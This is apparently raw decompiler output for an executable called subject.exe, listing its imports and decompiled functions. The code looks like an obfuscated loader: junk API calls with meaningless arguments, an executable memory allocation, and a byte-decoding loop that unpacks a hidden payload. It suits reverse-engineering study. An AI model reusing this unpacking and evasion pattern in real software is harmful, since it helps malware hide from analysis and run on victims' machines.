// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> * __imp__GetProcessHeap = &g_tE174; // 0040E000
<anonymous> * __imp__GetModuleHandleA = &g_tE186; // 0040E004
<anonymous> * __imp__VirtualAlloc = &g_tE19A; // 0040E008
<anonymous> * __imp__LoadLibraryA = &g_tE1AA; // 0040E00C
<anonymous> * __imp__ExitProcess = &g_tE1BA; // 0040E010
<anonymous> * __imp__CloseHandle = &g_tE1C8; // 0040E014
<anonymous> * __imp__GetModuleHandleA = &g_tE1D6; // 0040E018
<anonymous> * __imp__SetEvent = &g_tE1EA; // 0040E01C
<anonymous> * __imp__InitializeSecurityDescriptor = &g_tE204; // 0040E024
<anonymous> * __imp__AdjustTokenPrivileges = &g_tE224; // 0040E028
<anonymous> * __imp__RegDeleteKeyW = &g_tE23C; // 0040E02C
<anonymous> * __imp__RegQueryValueExW = &g_tE24C; // 0040E030
<anonymous> * __imp__AdjustTokenPrivileges = &g_tE260; // 0040E034
<anonymous> * __imp__SetBkColor = &g_tE286; // 0040E03C
<anonymous> * __imp__GetStockObject = &g_tE294; // 0040E040
<anonymous> * __imp__SetBkMode = &g_tE2A6; // 0040E044
<anonymous> * __imp__GetDlgItem = &g_tE2BC; // 0040E04C
<anonymous> * __imp__GetDC = &g_tE2CA; // 0040E050
<anonymous> * __imp__LoadStringW = &g_tE2D2; // 0040E054
<anonymous> * __imp__MoveWindow = &g_tE2E0; // 0040E058
<anonymous> * __imp__GetDC = &g_tE2EE; // 0040E05C
<anonymous> * __imp__EnableWindow = &g_tE2F6; // 0040E060
<anonymous> * __imp__CreateWindowExW = &g_tE306; // 0040E064
<anonymous> * __imp__LoadIconW = &g_tE318; // 0040E068
<anonymous> * __imp__DragAcceptFiles = &g_tE330; // 0040E070
<anonymous> * __imp__ShellExecuteExW = &g_tE342; // 0040E074
word32 g_dw40E0F8 = 57716; // 0040E0F8
word32 g_dw40E0FC = 57734; // 0040E0FC
word32 g_dw40E100 = 57754; // 0040E100
word32 g_dw40E104 = 57770; // 0040E104
word32 g_dw40E108 = 57786; // 0040E108
word32 g_dw40E10C = 57800; // 0040E10C
word32 g_dw40E110 = 0xE1D6; // 0040E110
word32 g_dw40E114 = 0xE1EA; // 0040E114
word32 g_dw40E11C = 0xE204; // 0040E11C
word32 g_dw40E120 = 0xE224; // 0040E120
word32 g_dw40E124 = 0xE23C; // 0040E124
word32 g_dw40E128 = 0xE24C; // 0040E128
word32 g_dw40E12C = 0xE260; // 0040E12C
word32 g_dw40E134 = 57990; // 0040E134
word32 g_dw40E138 = 58004; // 0040E138
word32 g_dw40E13C = 58022; // 0040E13C
word32 g_dw40E144 = 58044; // 0040E144
word32 g_dw40E148 = 58058; // 0040E148
word32 g_dw40E14C = 0xE2D2; // 0040E14C
word32 g_dw40E150 = 0xE2E0; // 0040E150
word32 g_dw40E154 = 0xE2EE; // 0040E154
word32 g_dw40E158 = 0xE2F6; // 0040E158
word32 g_dw40E15C = 58118; // 0040E15C
word32 g_dw40E160 = 0xE318; // 0040E160
word32 g_dw40E168 = 0xE330; // 0040E168
word32 g_dw40E16C = 58178; // 0040E16C
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 004010C4: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	ptr32 fp;
	ui32 edi;
	ui32 ebx;
	byte ch;
	byte cl;
	word16 ecx_16_16;
	word32 esi;
	GetProcessHeap();
	Eq_2 ebx_11 = ebx | edi - 0xC8C4;
	byte bh_15 = SLICE(ebx_11, byte, 8);
	byte ch_18 = bh_15 - ch - 1;
	word32 ecx_33 = SEQ(ecx_16_16, ch_18, cl) - (edi - 0xC8C4);
	byte cl_34 = (byte) ecx_33;
	word24 ecx_24_8_49 = SLICE(ecx_33, word24, 8);
	word16 ebx_16_16_88 = SLICE(ebx_11, word16, 16);
	byte bl_89 = (byte) ebx_11;
	Eq_35 edi_38 = edi - 0xC8C4 & 0xC2;
	Eq_39 ecx_50 = SEQ(ecx_24_8_49, cl_34 | 0xC6);
	byte bh_71 = bh_15 | (byte) CreateWindowExW(0xC4C9C4D2, null, null, ebx_11, ~0x342E332A, esi + 0x01, 0x00C3CAC2, 0xC2, ecx_50, (struct HMENU__ *) 0xD6D0, (struct HINSTANCE__ *) ~0x06F252B0, edi_38);
	Eq_2 eax_81 = CloseHandle((void *) 3448567675);
	LoadStringW((struct HINSTANCE__ *) 0xCAC2, SEQ(SLICE(eax_81, word24, 8), (byte) eax_81 - SLICE(eax_81, byte, 8) ^ bh_71) ^ 202, null, ~0x333F2438);
	word32 ebx_90 = SEQ(ebx_16_16_88, bh_71, bl_89);
	ui32 edx_108 = esi + 0x02 & ebx_90 + 0xC9;
	ui32 esi_117 = LoadIconW(null, (WCHAR *) 0x07BF) + (esi + 0x01) / 4;
	ui32 edx_121 = SEQ(SLICE(edx_108, word24, 8), (byte) edx_108 | ~0x31);
	CloseHandle((void *) 3702761760);
	SetEvent((void *) ~0x48A1AD0D);
	ui32 ebx_122 = (ebx_90 + 0xC9 | esi_117) & edx_121;
	up32 ecx_142 = ~SEQ(ecx_24_8_49, cl_34 | 0xC6) - (edx_121 - 0xC1);
	uint8 bl_130 = (byte) ebx_122;
	ui16 ebx_16_16_150 = SLICE(ebx_122, word16, 16);
	uint8 bh_139 = SLICE(ebx_122, byte, 8) - ~0x29 + (cl_34 | 0xC6);
	byte ch_173 = SLICE(ecx_142, byte, 8);
	byte cl_219 = (byte) ecx_142;
	word16 ecx_16_16_220 = SLICE(ecx_142, word16, 16);
	GetDC((struct HWND__ *) 3370755573);
	Eq_39 eax_160 = GetDlgItem((struct HWND__ *) 3447990235, ~0x302D232E);
	ui32 edx_152 = edx_121 - 0xC1 & SEQ(ebx_16_16_150, (bh_139 - 199) - (byte) (ecx_142 < 0x00), bl_130);
	uint8 bl_174 = (byte) eax_160;
	byte dh_163 = SLICE(edx_152, byte, 8);
	ui8 dl_166 = -(byte) edx_152;
	byte dl_191 = SLICE(SEQ(dl_166 - 211, (byte) GetDlgItem((struct HWND__ *) 3551212836, eax_160) + (dh_163 & 212)) - SEQ(ah_189, bl_174), byte, 8);
	ui8 ah_189 = SLICE(GetModuleHandleA(null), byte, 8);
	ui32 edx_193 = SEQ(SLICE(SEQ(SLICE(edx_152, word16, 16), dh_163 & 212, dl_166) - 211, word24, 8), dl_191);
	ui32 ecx_221 = SEQ(ecx_16_16_220, (ch_173 ^ bl_174) & 212, cl_219);
	uint32 edx_223 = edx_193 & 0xC3DD & 50900;
	ui32 ecx_225 = ecx_221 - 0x01 & 200;
	Eq_2 eax_229 = MoveWindow((struct HWND__ *) 3174688363, 14600149, 0xC6, 0x00DCC2D7, 0x00D1C4CE, 3385185498);
	if (eax_229 != 0x00)
		return eax_229;
	ui32 ecx_236 = -ecx_225;
	GetDC((struct HWND__ *) 2891815131);
	int64 eax_edx_714 = SEQ(eax_229, edx_223) - SEQ(0xC6, esi_117 + 0xDECA);
	ui32 edx_245 = (word32) eax_edx_714;
	ui32 ebx_252 = ~0xD510 - (word32) (SLICE(eax_edx_714, word32, 32) < 0x00);
	uint32 esi_256 = esi_117 + 0xDECA - (((edx_223 ^ 50900) - (esi_117 + 0xDECA)) - 55236 & 0xDEC7);
	struct Eq_285 * esp_262 = fp - 4;
	esi_271 = esi_256;
	do
	{
		uint32 esi_271;
		byte cl_307 = (byte) ecx_236 - 0x01;
		word24 ecx_24_8_317 = SLICE(ecx_236 - 0x01, word24, 8);
		ui32 edx_266 = edx_245 - 0xD5 - (word32) (esi_256 < 0x00);
		ebx_252 |= 220;
		ui32 esi_278 = -(esi_271 + (ecx_236 - 0x01));
		Eq_208 eax_289 = LoadLibraryA(esp_262->t0000);
		byte bl_300 = (byte) ebx_252;
		byte bh_305 = SLICE(ebx_252, byte, 8);
		word16 ebx_16_16_319 = SLICE(ebx_252, word16, 16);
		edx_245 = edx_266 ^ 199;
		byte dh_296 = SLICE(edx_266, byte, 8);
		ui8 dl_309 = (byte) edx_266 ^ 199;
		word16 edx_16_16_310 = SLICE(edx_266, word16, 16);
		esi_271 = esi_278 - 0xD1;
		++esp_262;
		byte ah_297 = SLICE(eax_289, byte, 8);
		byte al_328 = (byte) eax_289;
		ui24 eax_24_8_337 = SLICE(eax_289, word24, 8);
	} while (eax_289 != null);
	cu8 bl_301 = bl_300 - ah_297;
	cu8 dh_298 = dh_296 & ah_297;
	byte bh_306 = bh_305 & ah_297;
	ui32 esi_304 = esi_278 - 0xD1 - eax_289 - (word32) (bl_301 < 0x00);
	word32 edx_311 = SEQ(edx_16_16_310, dh_298, dl_309);
	word32 ecx_318 = SEQ(ecx_24_8_317, cl_307 & 0xC3);
	word24 ebx_24_8_320 = SEQ(ebx_16_16_319, bh_306);
	ui32 edx_327 = edx_311 ^ 0xCD | esi_304;
	word32 ecx_322 = ecx_318 - SEQ(ebx_24_8_320, bl_301 + 0x01);
	uint8 dl_335 = (byte) edx_327;
	ui32 ebx_345 = SEQ(ebx_16_16_319, bh_306 ^ 0xC9, bl_301 + 0x01 - dh_298);
	ui32 esi_348 = -esi_304;
	ui32 ecx_352 = ((SEQ(SLICE(ecx_322, word24, 8), (byte) ecx_322 ^ 0xC0) ^ 220 | SEQ(SLICE(edx_327, word16, 16), SLICE(edx_327, byte, 8) - dl_335, dl_335)) & ebx_345) + (esi_348 + 0x01);
	byte ch_363 = SLICE(ecx_352, byte, 8);
	byte cl_364 = (byte) ecx_352;
	word16 ecx_16_16_382 = SLICE(ecx_352, word16, 16);
	ui32 eax_355 = (SEQ(eax_24_8_337, (al_328 ^ bh_306) - ~0x25) & 0xC3) - ecx_352;
	ui32 eax_358 = eax_355 + ecx_352;
	ui32 ebx_360 = ebx_345 | ecx_352;
	ui32 ebx_370 = SEQ(SLICE(ebx_360, word16, 16), ~SLICE(ebx_360, byte, 8), (byte) ebx_360);
	ui32 ebx_378 = -(ebx_370 | 0xC1D4);
	byte al_373 = (byte) eax_358;
	cu8 bh_380 = SLICE(ebx_378, byte, 8) - 202 - (byte) ((ebx_370 | 0xC1D4) != 0x00);
	word32 ecx_385 = SEQ(ecx_16_16_382, ch_363 - cl_364 - 0xC9, cl_364 ^ al_373) - (esi_348 + 0x01) - (word32) (bh_380 < 0x00);
	byte ch_399 = SLICE(ecx_385, byte, 8);
	ui32 ebx_393 = (SEQ(SLICE(ebx_378, word16, 16), bh_380, (byte) ebx_378) + SEQ(SLICE(eax_358, word16, 16), al_373, al_373) | 55491) + 55491;
	word16 ecx_16_16_404 = SLICE(ecx_385, word16, 16);
	byte cl_400 = (byte) ecx_385 - ch_399;
	ui32 ebx_411 = SEQ(SLICE(ebx_393, word16, 16), SLICE(ebx_393, byte, 8) & 0xD8, (byte) ebx_393);
	ui32 ecx_425 = ~((SEQ(ecx_16_16_404, ch_399 | 222, cl_400) + 200 | 0xCC) & SLICE(SEQ(ebx_411, esi_348 + 0x01) - 0xC6C20000D5C5, word32, 32) + 0xC4 | 0xC4);
	fn004032E1(~0x00, ecx_425, esp_262->dwFFFFFFFC);
	ptr32 esp_632 = esp_262 + 73;
	do
	{
		struct Eq_528 * esp_648 = esp_632 + 0x04;
		word32 * esi_649 = esp_648->ptr0000;
		word32 * ebp_651 = esp_648->ptr0004;
		ci8 ah_663 = esp_648->b0019 & (esp_648->ptr0014)->b0022;
		ui32 eax_667 = *(ui32 *) 0x696161A1;
		do
			;
		while (ah_663 >= 0x00);
		word32 ebp_672 = *ebp_651;
		esp_632 = ebp_651 + 1;
		do
			;
		while (ah_663 != 0x00);
	} while ((eax_667 & 3374413358) != 0x00);
	*esi_649 = ebp_672;
}

// 00402A85: void fn00402A85(Register Eq_35 eax, Register (ptr32 byte) esi, Register uint32 edi)
// Called from:
//      fn00402B02
void fn00402A85(Eq_35 eax, byte * esi, uint32 edi)
{
	if (edi == 0x01)
		return;
	fn0040366A(edi - 0x01, (word32) eax + 1);
}

// 00402B02: void fn00402B02(Stack ui32 dwArg00)
// Called from:
//      fn004032E1
void fn00402B02(ui32 dwArg00)
{
	Eq_35 eax_257 = VirtualAlloc(0x00, 0x9332, 0x3000, 0x40);
	fn0040366A(SEQ(dwArg00, 0x1410), eax_257);
}

// 004030CB: void fn004030CB(Sequence ui64 esi_edi, Register Eq_35 eax)
// Called from:
//      fn00402B02
//      fn0040366A
void fn004030CB(ui64 esi_edi, Eq_35 eax)
{
	byte * esi = SLICE(esi_edi, word32, 32);
	byte cl_15 = *esi;
	ui8 cl_56 = (cl_15 ^ 0xA9) + 0x55;
	ui8 cl_70 = ~cl_56;
	byte cl_132 = __ror<byte,byte>(__rol<byte,byte>(cl_70 - 0x13, 0x19), 0x05);
	byte cl_158 = -cl_132;
	*eax.u0 = cl_158;
	fn00402A85(eax, esi, edi);
}

// 004032E1: void fn004032E1(Register word32 edx, Register ui32 edi, Stack ui32 dwArg00)
// Called from:
//      Win32CrtStartup
void fn004032E1(word32 edx, ui32 edi, ui32 dwArg00)
{
	fn00402B02(dwArg00);
}

// 0040366A: void fn0040366A(Sequence ui64 esi_edi, Register Eq_35 eax)
// Called from:
//      fn00402A85
//      fn00402B02
void fn0040366A(ui64 esi_edi, Eq_35 eax)
{
	fn004030CB(esi_edi, eax);
}

